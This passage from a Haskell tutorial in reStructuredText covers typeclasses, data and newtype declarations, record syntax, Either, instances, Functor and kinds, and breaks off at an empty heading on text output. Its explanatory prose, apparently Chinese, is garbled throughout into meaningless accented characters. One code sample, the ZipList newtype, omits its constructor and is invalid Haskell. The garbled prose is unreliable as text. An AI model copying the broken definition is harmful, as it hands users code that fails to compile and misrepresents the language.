      -  ``Eq`` ÔºöÂèØÂà§Êñ≠ÊòØÂê¶Áõ∏Á≠â
      -  ``Ord`` ÔºöÂèØÊØîËæÉÂ§ßÂ∞è
      -  ``Show`` ÔºöÂèØÂ±ïÁ§∫ÊàêÂ≠óÁ¨¶‰∏≤
      -  ``Read`` ÔºöÂèØ‰ªéÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢ÊàêÁâπÂÆöÁ±ªÂûã
      -  ``Enum`` ÔºöÂèØÊûö‰∏æÔºàËøûÁª≠ÔºâÔºåÂç≥ÂèØ‰ª•‰ΩøÁî®predÂíåsuccÂáΩÊï∞ÂæóÂà∞ÂâçÈ©±ÂíåÂêéÁºÄ
      -  ``Bounded``:
         Êúâ‰∏ä‰∏ãÁïåÔºåÂ¶ÇÊûúÂÖÉÁªÑ‰∏≠ÊâÄÊúâÂÖÉÁ¥†ÈÉΩÂ±û‰∫éBoundedÔºåÈÇ£Ëøô‰∏™ÂÖÉÁªÑÁöÑÁ±ªÂûã‰πüÂ±û‰∫éBounded
      -  ``Integral`` ÔºöÊòØÊï¥Êï∞ÔºåÂåÖÊã¨IntÂíåInteger
      -  ``RealFloat`` Ôºö ÊòØÂÆûÊµÆÁÇπÊï∞ÔºåÂåÖÊã¨FloatÂíåDouble
      -  ``RealFrac`` ÔºöÊòØÂÆûÂàÜÊï∞ÔºåÂåÖÊã¨Float„ÄÅDoubleÂíåRatioÔºàÂú®Data.RatioÊ®°Âùó‰∏≠Ôºâ
      -  ``Floating`` ÔºöÊòØÊµÆÁÇπÊï∞ÔºåÂåÖÊã¨Float„ÄÅDoubleÂíåComplexÔºàÂú®Data.ComplexÊ®°Âùó‰∏≠Ôºâ
      -  ``Real`` ÔºöÊòØÂÆûÊï∞ÔºåÂåÖÊã¨IntegralÂíåRealFracÁöÑÊàêÂëò
      -  ``Fractional`` ÔºöÊòØÂàÜÊï∞ÔºåÂåÖÊã¨RealFracÂíåFloatingÁöÑÊàêÂëò
      -  ``Num`` ÔºöÊòØÊï∞Â≠óÔºåÂåÖÊã¨‰∏äËø∞ÊâÄÊúâÊï∞Â≠óÁõ∏ÂÖ≥ÁöÑÁ±ªÂûã

      .. rubric:: ` <#Type-variables>`__ Type variables
         :name: Type-variables

      Â¶ÇÊûúÊü•Áúã‰∏Ä‰∏™ÂáΩÊï∞ÁöÑÁ±ªÂûãÔºåÊØîÂ¶Ç ``head`` ÔºåÈÇ£‰πàÂ∞Ü‰ºöËøîÂõû‰ª•‰∏ãÁ±ªÂûãÔºö

      head :: [a] -> a

      ÂÖ∂‰∏≠ÁöÑaÂ∞±ÊòØ‰∏Ä‰∏™Á±ªÂûãÂèòÈáèÔºàtype
      variableÔºâÔºåÂÆÉÂú®head‰∏≠ÂèØ‰ª•Â±û‰∫é‰ªª‰ΩïÁ±ªÂûãÔºåÂú®ËøôÈáåÂè™ÊòØË°®Á§∫ËøîÂõûÂÄºÁöÑÁ±ªÂûãÂíåËæìÂÖ•ÁöÑÂàóË°®‰∏≠ÁöÑÂÖÉÁ¥†ÁöÑÁ±ªÂûãÁõ∏‰∏ÄËá¥„ÄÇ

      Âú®ÂáΩÊï∞ÁöÑÁ±ªÂûãË°®ËææÂºèÂÖ∂ÂÆûÂèØ‰ª•Áúã‰Ωú$\\lambda$Ë°®ËææÂºèÔºåÂÆÉÈÄÇÁî®‰∫é$\\alpha$ÂèòÊç¢Ôºà$\\alpha$-conversionÔºâ„ÄÇÂç≥aÂú®ËøôÈáåÂèØ‰ª•ÊåáInt„ÄÅCharÁ≠âÁ±ªÂûãÔºå‰πüÂèØ‰ª•Êåá[Char],
      (Int, Char), ÁîöËá≥ÂáΩÊï∞Int -> IntÁ≠â„ÄÇ

      Âú®Â§ßÈÉ®ÂàÜÂáΩÊï∞ÁöÑÁ±ªÂûã‰∏≠ÔºåÁ±ªÂûãÂèòÈáèÈúÄË¶Å‰øùËØÅÊòØÊüê‰∏™TypeclassÁöÑÊàêÂëòÊâçËÉΩÂÆåÊàêÊìç‰Ωú„ÄÇÊØîÂ¶Ç ``(==)`` ÂáΩÊï∞ÔºåÂÆÉÈúÄË¶Å‰º†ÂÖ•ÁöÑÂèÇÊï∞ÊòØÂèØÂà§Êñ≠Áõ∏Á≠âÁöÑÔºåÂç≥ÊòØEqÁöÑÊàêÂëòÔºåÈÇ£‰πà ``(==)`` ÁöÑÁ±ªÂûãÂ∞±ÊòØÔºö

      (==) :: (Eq a) => a -> a -> Bool

      ÂÖ∂‰∏≠ ``=>`` ÂâçÁöÑÈÉ®ÂàÜ(Eq a)Â∞±ÊòØÁ±ªÁ∫¶ÊùüÔºàclass
      constraintÔºâÔºåÂÆÉËßÑÂÆö‰∫ÜaÊòØEqÁöÑÊàêÂëòÔºåÊâÄ‰ª• ``(==)`` ÂáΩÊï∞‰º†ÂÖ•ÁöÑ‰∏§‰∏™ÂèÇÊï∞ÈÉΩÊòØaÁ±ªÂûãÔºå‰∏îÈÉΩÊòØEqÁöÑÊàêÂëòÔºå‰øùËØÅ‰∫ÜÂÆÉ‰ª¨‰πãÈó¥ÊòØÂèØ‰ª•ÊØîËæÉÊòØÂê¶Áõ∏Á≠âÁöÑ„ÄÇ

      .. rubric:: ` <#ÂÆö‰πâÊñ∞Type>`__ ÂÆö‰πâÊñ∞Type
         :name: ÂÆö‰πâÊñ∞Type

      ÂÆö‰πâ‰∏Ä‰∏™Êñ∞ÁöÑTypeÈúÄË¶Å‰ΩøÁî® ``data`` ÂÖ≥ÈîÆÂ≠óÔºåÊØîÂ¶ÇÂÆö‰πâ ``Bool`` ÈúÄË¶Å‰ΩøÁî®Ôºö

      data Bool = False \| True

      | ÂÖ∂‰∏≠ ``=`` Â∑¶‰æßÁöÑÈÉ®ÂàÜÂÆö‰πâ‰∫ÜÊñ∞Á±ªÂûãÁöÑÂêçÁß∞ ``Bool`` ÔºåÂè≥‰æßÁöÑÈÉ®ÂàÜÂè´ÂÅöÂÄºÊûÑÈÄ†Âô®Ôºàvalue
        constructorsÔºâÔºåË°®Á§∫‰∫ÜBoolÁ±ªÂûãÁöÑÂÄº‰∏∫FalseÊàñTrue„ÄÇ
      | Âπ∂‰∏îÂêçÁß∞ÂíåÂÄºÊûÑÈÄ†Âô®ÁöÑÈ¶ñÂ≠óÊØçÈÉΩÈúÄË¶ÅÂ§ßÂÜô„ÄÇ

      Âè¶Â§ñÔºåÂÄºÊûÑÈÄ†Âô®‰πüÊòØÂáΩÊï∞ÔºåÂÆÉ‰ª¨ÂèØ‰ª•ÊúâÂèÇÊï∞ÔºåÂè´ÂÅöÈ°πÔºàfieldÔºâ„ÄÇÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         data Shape = Circle Float Float Float | Rectangle Float Float Float Float   

      | ÂÆÉÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Êñ∞TypeÂè´ShapeÔºåÂÄºÊûÑÈÄ†Âô®ÊòØCircleÂíåRectangleÔºåCircleÊé•Êî∂‰∏â‰∏™ÂèÇÊï∞ÈÉΩÊòØFloatÁ±ªÂûãÔºåRectangleÊé•Êî∂Âõõ‰∏™FloatÁ±ªÂûãÂèÇÊï∞„ÄÇ
      | Â¶ÇÊûúÊü•ÁúãCircleÁöÑÁ±ªÂûãÔºåÂ∞ÜËøîÂõûÔºö

      Circle :: Float -> Float -> Float -> Shape

      Â¶ÇÊûúÊÉ≥Ë¶ÅËÆ©ÂÆÉËÉΩÁªôÁõ¥Êé•ÊòæÁ§∫Âá∫Êù•ÔºåÈúÄË¶ÅËÆ©ÂÆÉÂ±û‰∫éShowÁ±ªÂûãÁ±ª„ÄÇÂú®‰ª£Á†Å‰∏≠Âè™ÈúÄË¶ÅÂú®ÁªìÂ∞æÂä†‰∏ä ``deriving (Show)``:

      .. container:: float highlight haskell
      ::

         data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving (Show)

      Á±ªÂûãÁöÑÂêçÁß∞ÂíåÂÄºÊûÑÈÄ†Âô®ÂêçÁß∞‰πüÂèØ‰ª•Áõ∏ÂêåÔºåÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         data Point = Point Float Float deriving (Show)

      .. rubric:: ` <#ÂØºÂá∫Type>`__ ÂØºÂá∫Type
         :name: ÂØºÂá∫Type

      Âú®Êñá‰ª∂‰∏≠ÂÆö‰πâ‰∫ÜÊñ∞ÁöÑType‰πãÂêéÔºåÂ¶ÇÊûúÂú®Âà´ÁöÑÊñá‰ª∂‰∏≠Â∞ÜÂÖ∂‰Ωú‰∏∫Ê®°ÂùóÂØºÂÖ•ÔºåÂàôÈúÄË¶ÅÂÖàÂØºÂá∫„ÄÇÊØîÂ¶ÇÊñá‰ª∂ ``Shapes.hs`` ‰∏≠ÂÆö‰πâ‰∫ÜShapeÂíåPointÔºå‰ª•ÂèäÂÖ∂‰ªñÁöÑ‰∏Ä‰∫õÂáΩÊï∞ÔºåÈÇ£‰πàÊñá‰ª∂ÂºÄÂ§¥ÈúÄË¶ÅÂÜôÔºö

      .. container:: float highlight haskell
      ::

         module Shapes
         ( Shape(..)
         , Point(..)
         , functionA
         , functionB
         ) where

      ÂÖ∂‰∏≠ÁöÑ ``Shape(..)`` ÂØºÂá∫‰∫ÜShapeÁ±ªÂûãÂíåÂÆÉÊâÄÊúâÁöÑÂÄºÊûÑÈÄ†Âô®Ôºå ``..`` ‰ª£Ë°®‰∫ÜÂÆÉÁöÑÊâÄÊúâÂÄºÊûÑÈÄ†Âô®„ÄÇÂõ†Ê≠§Ôºå ``Shape(..)`` Áõ∏ÂΩì‰∫é ``Shape (Circle, Rectangle)`` „ÄÇ

      Â¶ÇÊûú‰∏çÊÉ≥Ë¶ÅÂØºÂá∫ÂÄºÊûÑÈÄ†Âô®ÔºåÂç≥‰∏çÂÖÅËÆ∏‰ΩøÁî®ÂÄºÊûÑÈÄ†Âô®ÁöÑÊñπÊ≥ïÊù•ÂàõÂª∫ShapeÁ±ªÂûãÁöÑÂèòÈáè„ÄÇÈÇ£‰πàÈúÄË¶ÅÂ∞Ü ``Shape(..)`` ÊõøÊç¢‰∏∫ ``Shape`` ÔºåËøôÊ†∑Â∞±Âè™ÂØºÂá∫‰∫ÜShapeÁ±ªÂûãÔºåËÄå‰∏çÂØºÂá∫ÂÖ∂ÂÄºÊûÑÈÄ†Âô®„ÄÇ

      .. rubric:: ` <#Record-Syntax>`__ Record Syntax
         :name: Record-Syntax

      Â¶ÇÊûúÊÉ≥Ë¶ÅÊñπ‰æøÂú∞ÂèñÂá∫Á±ªÂûãÂÆû‰æã‰∏≠ÁöÑÂèÇÊï∞ÔºåÂèØ‰ª•‰ΩøÁî®RecordËØ≠Ê≥ïÔºåÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         data Point = Point { xcoord :: Float
                            , ycoord :: Float
                            } deriving (Show)

      Âú®ÂÄºÊûÑÈÄ†Âô®ÁöÑÂèÇÊï∞ÈÉ®ÂàÜÂÖàÂä†‰∏Ä‰∏™Â§ßÊã¨Âè∑ÔºåÁÑ∂ÂêéÊåáÂÆöÂèñÂá∫ÂÄºÁöÑÂáΩÊï∞ÂêçÁß∞Ôºàxcoord,
      ycoordÔºâÔºåÂêéÈù¢ÊåáÂÆöÁ±ªÂûãÔºà::
      FloatÔºâ„ÄÇËøôÊ†∑xcoordÂíåycoordÂ∞±ÈÉΩÊòØ‰∏Ä‰∏™Á±ªÂûã‰∏∫Point ->
      FloatÁöÑÂáΩÊï∞ÔºåÂèØ‰ª•ÈÄöËøá‰∏ãÈù¢ÊñπÊ≥ïÊù•ËÆøÈóÆÂÄºÔºö

      .. container:: float highlight haskell
      ::

         ghci> let point = Point 1.0 2.0
         ghci> xcoord point
         1.0
         ghci> ycoord point
         2.0

      ÂêåÊó∂‰πüÂèØ‰ª•ÈÄöËøá‰∏ãÈù¢ÊñπÊ≥ïÊù•ÂàõÂª∫Ëøô‰∏™pointÔºö

      .. container:: float highlight haskell
      ::

         point = Point {ycoord=2.0, xcoord=1.0}

      .. rubric:: ` <#Type-parameters>`__ Type parameters
         :name: Type-parameters

      ÂÄºÊûÑÈÄ†Âô®ÂèØ‰ª•Êé•Êî∂ÂèÇÊï∞ÔºåÁ±ªÂûã‰πüÂèØ‰ª•Êé•Êî∂ÂèÇÊï∞ÔºåËøôÊ†∑ÂÆÉÂ∞±Êàê‰∏∫‰∫ÜÁ±ªÂûãÊûÑÈÄ†Âô®Ôºàtype
      constructorsÔºâ„ÄÇÂ¶ÇMaybeÁöÑÂÆö‰πâÔºö

      data Maybe a = Nothing \| Just a

      | ÂÆÉÁöÑÂÄºÊòØNothingÊó∂ÔºåÁ±ªÂûã‰∏∫Maybe
        aÔºåÊòØÂ§öÊÄÅÁöÑÔºàpolymorphicÔºâ„ÄÇ
      | ‰ªñÁöÑÂÄº‰∏çÊòØNothingÊó∂ÔºåÁ±ªÂûãÂèñÂÜ≥‰∫éÂÄºJust
        a‰∏≠aÁöÑÁ±ªÂûãÔºåÂèØ‰ª•ÊûÑÈÄ†Âá∫Maybe Int„ÄÅMaybe
        [Char]Á≠âÂ§öÁßçÁ±ªÂûãÔºö

      .. container:: float highlight haskell
      ::

         Nothing :: Maybe a
         Just 1 :: Num a => Maybe a
         Just 'a' :: Maybe Char
         Just "abc" :: Maybe [Char]

      ÂèØ‰ª•Áî®ËøôÁßçÊñπÊ≥ïÊîπÂÜôPointÔºö

      .. container:: float highlight haskell
      ::

         data Point x y = Point { xcoord :: x
                                , ycoord :: y
                                } deriving (Show)

      ‰ΩÜ‰ΩøÁî®Á±ªÂûãÂèÇÊï∞Ôºàtype
      parametersÔºâÂπ∂‰∏çÊòØÊÄªÊòØÊñπ‰æøÔºåÊØîÂ¶ÇÂú®Â£∞ÊòéÂáΩÊï∞Á±ªÂûãÁöÑÊó∂ÂÄô‰∏çËÉΩÂè™‰ΩøÁî®PointÊù•Ë°®Á§∫PointÁ±ªÂûãÔºåËÄåÊòØÂøÖÈ°ªÂÜôÊàêPoint
      Float Float„ÄÇ

      ËÄå‰∏î‰∏çËÉΩÂú®ÂÆö‰πâÁ±ªÂûãÊûÑÈÄ†Âô®Êó∂Ê∑ªÂä†Á±ªÁ∫¶ÊùüÔºàclass
      constraintÔºâÔºå‰∏çÁÑ∂Âú®‰πãÂêéÂ£∞ÊòéÂáΩÊï∞Á±ªÂûãÁöÑÊó∂ÂÄô‰πüÈÉΩÈúÄË¶ÅÊ∑ªÂä†Á±ªÁ∫¶ÊùüÔºåÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         data (Ord k) => Map k v = ... 
         toList :: (Ord k) => Map k a -> [(k, a)]

      .. rubric:: ` <#Either>`__ Either
         :name: Either

      EitherÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®ÔºåÂÆÉÊúâ‰∏§‰∏™ÂÄºÊûÑÈÄ†Âô®ÔºåÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         data Either a b = Left a | Right b deriving (Eq, Ord, Read, Show)  

      Â¶ÇÊûú‰ΩøÁî®‰∫ÜLeftÔºåÈÇ£ÂÆÉÁöÑaÁöÑÁ±ªÂûãÂ∞±ÊòØÂÖ∑‰ΩìÁöÑÔºõÂ¶ÇÊûú‰ΩøÁî®‰∫ÜRightÔºåÈÇ£ÂÆÉÁöÑbÁöÑÁ±ªÂûãÂ∞±ÊòØÂÖ∑‰ΩìÁöÑÔºö

      .. container:: float highlight haskell
      ::

         ghci> Right 20  
         Right 20  
         ghci> Left "w00t"  
         Left "w00t"  
         ghci> :t Right 'a'  
         Right 'a' :: Either a Char  
         ghci> :t Left True  
         Left True :: Either Bool b  

      EitherÂèØ‰ª•Áúã‰ΩúMaybeÁöÑË°•ÂÖÖÔºåÊØîÂ¶ÇMaybeÂú®‰ΩøÁî®Êó∂ÔºåÂá∫Áé∞ÂºÇÂ∏∏ÂèØ‰ª•ËøîÂõûNothingÔºå‰ΩÜÂè™ÊòØ‰∏Ä‰∏™NothingÔºå‰∏çÂåÖÂê´‰ªª‰Ωï‰ø°ÊÅØÔºõ‰ΩÜEitherÂåÖÂê´Â∑¶ÂÄºÂíåÂè≥ÂÄºÔºåÊ≠£Â∏∏ÁªìÊûúËøîÂõûÂè≥ÂÄºÔºåËÄåÂá∫Áé∞ÂºÇÂ∏∏Â∞±ÂèØ‰ª•ËøîÂõûÂåÖÂê´ÈîôËØØ‰ø°ÊÅØÁöÑÂ∑¶ÂÄºÔºåÊØîÂ¶ÇÂÆâÂÖ®Èô§Ê≥ïÔºö

      .. container:: float highlight haskell
      ::

         safeDiv :: Int -> Int -> Maybe Int
         safeDiv _ 0 = Nothing
         safeDiv x y = Just (x `div` y)

         ghci> safeDiv 4 2
         Just 2
         ghci> safeDiv 1 0
         Nothing

      ËÄå‰ΩøÁî®EitherÔºö

      .. container:: float highlight haskell
      ::

         safeDiv :: Int -> Int -> Either String Int
         safeDiv _ 0 = Left "Divided by zero"
         safeDiv x y = Right (x `div` y)

         ghci> safeDiv 4 2
         Right 2
         ghci> safeDiv 1 0
         Left "Divided by zero"

      .. rubric:: ` <#Derived-instances>`__ Derived
         instances
         :name: Derived-instances

      ÊÉ≥Ë¶Å‰Ωø‰∏Ä‰∏™ÂÆö‰πâÁöÑÁ±ªÊª°Ë∂≥Êüê‰∫õTypeclassÁöÑÈúÄÊ±ÇÔºåÈúÄË¶Å‰ªéÂÖ∂Ê¥æÁîüÔºàderiveÔºâÔºåÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday   
                    deriving (Eq, Ord, Show, Read, Bounded, Enum)  

      ËøôÊ†∑DayÁ±ªÂûãÁöÑÂÄºÔºàMondayÔΩûSundayÔºâ‰πãÈó¥Â∞±ÂèØ‰ª•ÊØîËæÉÊòØÂê¶Áõ∏Á≠âÔºà‰ªéEqÊ¥æÁîüÔºâÔºåÊØîËæÉÂ§ßÂ∞èÔºà‰ªéOrdÊ¥æÁîüÔºåÂ∑¶‰æß‰∏∫Â∞èÔºåÂè≥‰æß‰∏∫Â§ßÔºâÔºåÊòæÁ§∫ÊàêÂ≠óÁ¨¶‰∏≤Ôºà‰ªéShowÊ¥æÁîüÔºâÔºå‰ªéÂ≠óÁ¨¶‰∏≤‰∏≠ËØªÂèñÔºà‰ªéReadÊ¥æÁîüÔºâÔºåÂåÖÂê´ËæπÁïåÔºà‰ªéBoundedÊ¥æÁîüÔºâÔºåÂèØ‰ª•Êûö‰∏æÔºà‰ªéEnumÊ¥æÁîüÔºåÊåâÁÖßÂÄºÊûÑÈÄ†Âô®‰∏≠ÁöÑÈ°∫Â∫è‰æùÊ¨°ÂêëÂè≥Ôºâ

      .. rubric:: ` <#Type-synonyms>`__ Type synonyms
         :name: Type-synonyms

      ‰∏∫‰∫ÜÈòÖËØªÊñπ‰æøÔºå‰π¶ÂÜôÁÆÄ‰æøÔºåÂèØ‰ª•‰ΩøÁî® ``type`` ÂÖ≥ÈîÆÂ≠ó‰∏∫Â∑≤ÊúâÁ±ªÂûãÂàõÂª∫Âà´ÂêçÔºàsynonymsÔºâ„ÄÇÊØîÂ¶ÇStringÁöÑÂÆö‰πâÔºö

      type String = [Char]

      | Âú®ÊâÄÊúâÈúÄË¶Å‰ΩøÁî®Â≠óÁ¨¶‰∏≤ÔºàÂç≥[Char]ÔºâÁöÑÂú∞ÊñπÈÉΩÂèØ‰ª•‰ΩøÁî®StringÊù•‰ª£ÊõøÔºåÂÆÉ‰ª¨ÊòØÂÆåÂÖ®‰∏ÄËá¥ÁöÑÔºåÂè™ÊòØStringÊõ¥ÁÆÄ‰æøÊòìËØª„ÄÇ
      | ÂêåÊó∂ÔºåÁ±ªÂûãÂà´Âêç‰πüÂèØ‰ª•Êé•Êî∂Á±ªÂûãÂèÇÊï∞

      .. rubric:: ` <#newtype-keyword>`__ newtype keyword
         :name: newtype-keyword

      Èô§‰∫Ü ``data`` „ÄÅ ``type`` ÂÖ≥ÈîÆÂ≠ó‰πãÂ§ñÔºåËøòÂèØ‰ª•Áî® ``newtype`` ÂÖ≥ÈîÆÂ≠óÊù•ÂÆö‰πâ‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÂûãÔºåÊØîÂ¶Ç ``Control.Applicative`` Ê®°Âùó‰∏≠ÁöÑZipListÔºö

      .. container:: float highlight haskell
      ::

         newtype ZipList a = { getZipList :: [a] }

      -  ‰∏çÂêå‰∫étypeÔºåÂÆÉ‰∏çÊòØÂà´ÂêçÔºåÂèØ‰ª•‰ΩøÁî®recordËØ≠Ê≥ïÊù•Áõ¥Êé•ÂÆö‰πâÂèñÂá∫ÂÄºÁöÑÂáΩÊï∞
      -  ‰∏çÂêå‰∫édataÔºåÂÆÉÂè™ËÉΩÊúâ‰∏Ä‰∏™ÂÄºÊûÑÈÄ†Âô®Ôºå‰ΩÜÊòØÈÄüÂ∫¶Ë¶ÅÊØîdataÂø´ÔºåËÄå‰∏îÊõ¥Âä†ÊáíÊÉ∞

      .. rubric:: ` <#Recursive-data-structures>`__ Recursive
         data structures
         :name: Recursive-data-structures

      ‰∏Ä‰∏™Á±ªÂûã‰πüÂèØ‰ª•ÈÄíÂΩíÂÆö‰πâÔºåÊØîÂ¶Ç‰∏ÄÈ¢ó‰∫åÂèâÊ†ëÔºö

      .. container:: float highlight haskell
      ::

         data Tree a = EmptyTree | Node a (Tree a) (Tree a) deriving (Show, Read, Eq)  

      .. rubric:: ` <#ÂÆö‰πâÊñ∞Typeclass>`__ ÂÆö‰πâÊñ∞Typeclass
         :name: ÂÆö‰πâÊñ∞Typeclass

      ÂÆö‰πâ‰∏Ä‰∏™Êñ∞ÁöÑTypeclassÈúÄË¶Å‰ΩøÁî®classÂÖ≥ÈîÆÂ≠óÔºå‰æãÂ¶ÇÂÆö‰πâEqÁ±ªÂûãÁ±ªÔºö

      .. container:: float highlight haskell
      ::

         class Eq a where  
             (==) :: a -> a -> Bool  
             (/=) :: a -> a -> Bool  
             x == y = not (x /= y)  
             x /= y = not (x == y)  

      ÂÖ∂‰∏≠ ``a`` ÊòØ‰∏Ä‰∏™Á±ªÂûãÂèòÈáèÔºåÂâç‰∏§Ë°åÂ£∞Êòé‰∫ÜÈúÄË¶ÅÂÆûÁé∞ÁöÑÂáΩÊï∞ÁöÑÂêçÂ≠óÂèäÂÖ∂Á±ªÂûãÔºåÂêé‰∏§Ë°åË°®Êòé‰∫ÜÈúÄË¶ÅÁöÑÂáΩÊï∞‰πãÈó¥ÂèØ‰ª•Áõ∏‰∫íÂÆö‰πâÔºà‰∏çÂøÖË¶ÅÔºâ„ÄÇ

      ÂåÖÂê´‰∫ÜÂêé‰∏§Ë°å‰πãÂêéÔºåÂè™ÂÆö‰πâ(==)ÂáΩÊï∞ÊàñËÄÖ(/=)ÂáΩÊï∞ÈÉΩÂèØ‰ª•ÂÆåÊàêÂÖ®ÈÉ®ÂÆö‰πâÔºåÂÆÉ‰ª¨Ôºà ``(==) | (/=)`` ÔºâÊàê‰∏∫Ëøô‰∏™Á±ªÂûãÁ±ªÁöÑÊúÄÂ∞èÂÆåÊï¥ÂÆö‰πâÔºàminimal
      complete definitionÔºâ

      Êü•Áúã‰∏Ä‰∏™Á±ªÂûãÁ±ªÁöÑÊàêÂëòÈúÄË¶ÅÂÆûÁé∞ÁöÑÂáΩÊï∞ÂèØ‰ª•Âú®GHCi‰∏≠‰ΩøÁî® ``:info`` Ôºö

      ghci> :info Eq

      .. rubric:: ` <#ÊâãÂä®ÂàõÂª∫ÂÆû‰æã>`__ ÊâãÂä®ÂàõÂª∫ÂÆû‰æã
         :name: ÊâãÂä®ÂàõÂª∫ÂÆû‰æã

      ‰Ωø‰∏Ä‰∏™Á±ªÂûãÊàê‰∏∫‰∏Ä‰∏™Á±ªÂûãÁ±ªÁöÑÂÆû‰æãÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® ``deriving`` Êù•Ëá™Âä®ÂÆåÊàêÔºå‰πüÂèØ‰ª•ÈÄöËøá‰ΩøÁî®instanceÂÖ≥ÈîÆÂ≠óÊù•ÊâãÂä®ÂÆåÊàê„ÄÇÊØîÂ¶Ç‰ΩøPointÊàê‰∏∫ShowÁöÑÂÆû‰æãÔºö

      .. container:: float highlight haskell
      ::

         instance Show Point where
             show (Point x y) = "(" ++ show x ++ ", " ++ show y ++ ")"

         -- in ghci
         ghci> Point 1.0 2.0
         (1.0, 2.0)

      ËøôÊ†∑Â∞±ÂèØ‰ª•Ëá™ÂÆö‰πâÊòæÁ§∫ÁöÑÂÜÖÂÆπÔºåÂê¶Âàô‰ΩøÁî®derivingÁöÑËØùÂè™‰ºöÁõ¥Êé•Â∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇ

      ÂêåÊó∂‰πüË¶ÅÊ≥®ÊÑèÁ±ªÂûãÂíåÁ±ªÂûãÊûÑÈÄ†Âô®ÁöÑÂå∫Âà´Ôºå‰º†ÂÖ•ÁªôinstanceÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Â∫îËØ•‰∏∫Á±ªÂûãËÄå‰∏çÊòØÁ±ªÂûãÊûÑÈÄ†Âô®ÔºåÊØîÂ¶ÇMaybeÔºö

      .. container:: float highlight haskell
      ::

         instance Eq Maybe where  
             ...    
         -- ÈîôËØØÁî®Ê≥ïÔºåÂõ†‰∏∫MaybeÊòØÁ±ªÂûãÊûÑÈÄ†Âô®ËÄå‰∏çÊòØÁ±ªÂûã

         instance Eq (Maybe m) where  
             ...
         -- ÈîôËØØÁî®Ê≥ïÔºåÂõ†‰∏∫m‰∏ç‰∏ÄÂÆöÊòØEqÁöÑÊàêÂëò

         instance (Eq m) => Eq (Maybe m) where  
             Just x == Just y = x == y  
             Nothing == Nothing = True  
             _ == _ = False  

      .. rubric:: ` <#Functor-Typeclass>`__ Functor
         Typeclass
         :name: Functor-Typeclass

      Functor‰πüÊòØ‰∏ÄÁßçÁ±ªÂûãÁ±ªÔºåÂÆÉÂè™ËßÑÂÆö‰∫Ü‰∏Ä‰∏™ÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         class Functor f where
             fmap :: (a -> b) -> f a -> f b

      ÂÖ∂‰∏≠ ``f`` ÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®ÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûã

      .. rubric:: ` <#Kinds>`__ Kinds
         :name: Kinds

      ‰∏Ä‰∏™ÂÄºÁöÑÁ±ªÂûãÂè´ÂÅöÁ±ªÂûãÔºàTypeÔºâÔºåËÄå‰∏Ä‰∏™Á±ªÂûãÁöÑÁ±ªÂûãÂè´ÂÅöKind„ÄÇÂèØ‰ª•ÈÄöËøáGHCi‰∏≠ ``:k`` Êù•Êü•ÁúãKindÔºö

      .. container:: float highlight haskell
      ::

         ghci> :k Int
         Int :: *
         ghci> :k Maybe
         Maybe :: * -> *
         ghci> :k Maybe Int
         Maybe Int :: *
         ghci> :k Either
         Either :: * -> * -> *

      ÂÖ∂‰∏≠ÁöÑÊòüÂè∑ ``*`` ‰ª£Ë°®‰∫Ü‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûãÔºàconcrete
      typeÔºâ„ÄÇIntÊú¨Ë∫´Â∞±ÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûãÔºåÊâÄ‰ª•IntÁöÑKindÊòØ\*„ÄÇËÄåMaybeÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®ÔºåÂÆÉÊé•Êî∂‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûãËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑÂÖ∑‰ΩìÁ±ªÂûãÔºåÊâÄ‰ª•MaybeÁöÑKindÊòØ\*
      -> \*„ÄÇÂ¶ÇÊûúÁªôMaybe‰º†ÂÖ•‰∫Ü‰∏Ä‰∏™IntÔºåÈÇ£‰πàÂæóÂà∞ÁöÑMaybe
      IntÂ∞±ÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÁ±ªÂûãÔºåÂÆÉÁöÑKindÂ∞±ÊòØ\*„ÄÇEither‰πüÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®Ôºå‰ΩÜÂÆÉÊé•Êî∂‰∏§‰∏™Á±ªÂûãÊâç‰∫ßÁîü‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÂûãÔºåÊâÄ‰ª•EitherÁöÑKindÊòØ\*
      -> \* -> \*„ÄÇ

   .. rubric:: ` <#Input-Output>`__ Input/Output
      :name: Input-Output

      .. rubric:: ` <#ËøêË°åHaskellÁ®ãÂ∫è>`__ ËøêË°åHaskellÁ®ãÂ∫è
         :name: ËøêË°åHaskellÁ®ãÂ∫è

      ‰∏çÂú®GHCi‰∏≠ËøêË°å‰∏Ä‰∏™HaskellÁ®ãÂ∫èÊúâ‰∏§ÁßçÊñπÂºèÔºö

      #. ÁºñËØëËøêË°åÔºö

         .. container:: float highlight sh

         ::

            $ ghc --make code
            $ ./code

      #. ÈÄöËøá ``runhaskell`` ÂëΩ‰ª§Áõ¥Êé•ËøêË°åÔºö

         .. container:: float highlight sh

            ::

            $ runhaskell code.hs

      .. rubric:: ` <#ËæìÂá∫ÊñáÊú¨>`__ ËæìÂá∫ÊñáÊú¨
         :name: ËæìÂá∫ÊñáÊú¨

